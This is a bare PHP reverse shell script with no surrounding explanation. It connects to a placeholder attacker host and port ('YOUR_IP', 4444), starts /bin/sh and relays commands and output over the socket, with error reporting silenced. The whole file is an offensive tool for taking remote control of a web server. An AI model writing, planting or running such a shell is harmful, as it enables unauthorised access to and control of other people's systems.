<?php
// Reverse shell to connect to attacker-controlled host
error_reporting(0);
$ip = 'YOUR_IP'; // Replace with your IP
$port = 4444; // Replace with your port (e.g., 4444)
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']], $pipes);
while (!feof($pipes[1])) {
    fwrite($sock, fread($pipes[1], 1024));
    fwrite($pipes[0], fread($sock, 1024));
}
fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
proc_close($proc);
?>